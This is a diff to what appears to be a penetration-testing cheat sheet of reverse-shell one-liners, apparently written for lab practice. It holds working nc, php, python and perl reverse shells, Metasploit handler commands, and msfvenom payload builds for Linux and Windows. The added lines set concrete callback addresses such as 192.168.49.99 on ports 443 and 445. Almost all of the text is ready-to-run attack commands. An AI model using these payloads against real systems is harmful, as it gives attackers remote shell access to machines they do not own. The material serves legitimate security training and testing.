@@ -53,7 +53,7 @@ nc -e /bin/bash 10.10.10.1 4444
 ````
 php -r '$sock=fsockopen("10.10.16.1",4446);exec("/bin/sh -i <&3 >&3 2>&3");' 
 
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' 
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.99",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' 
 
 perl -e 'use Socket;$i="10.10.10.1";$p=4446;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' 
 
@@ -114,11 +114,12 @@ msfconsole -x "use exploit/multi/handler; set payload linux/x86/meterpreter/reve
 
 UnStaged 
 
+msfvenom -p linux/x64/shell_reverse_tcp -f elf -o shell LHOST=192.168.49.99 LPORT=445
 msfvenom -p linux/x64/shell_reverse_tcp RHOST=IP LPORT=PORT -f elf > shell.elf  
 msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe 
 
 Staged  
-
+msfvenom -p cmd/windows/reverse_powershell lhost=192.168.49.230 lport=443 > shell.bat
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf   
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe 
 
